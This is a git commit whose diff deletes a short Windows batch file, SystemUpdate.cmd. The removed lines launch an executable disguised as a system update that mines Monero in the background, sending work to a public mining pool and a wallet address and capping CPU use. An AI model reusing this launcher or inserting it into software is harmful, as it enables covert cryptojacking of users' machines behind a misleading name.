86a47794735e6f27e113b454102efa3fc57eb8df
guiwmachad <64431631+guiwmachad@users.noreply.github.com>
2021-05-07 11:06:04 -0300

    Delete SystemUpdate.cmd

--- SystemUpdate.cmd
+++
@@ -1,3 +0,0 @@
-cd %~dp0
-SystemUpdate.exe -o pool.supportxmr.com:3333 -a rx/0 -u 8B6ExmrA62wgv1YH1fwDzXfpaJ58ctchUbTM3r54HQb2AmCGj8KEBZG6dniMDXBZQYCe9873NzvmUaX9WnWFXwBi5iX9xPp -p x --cpu-max-threads-hint 40 --donate-level=0 --background
-pause
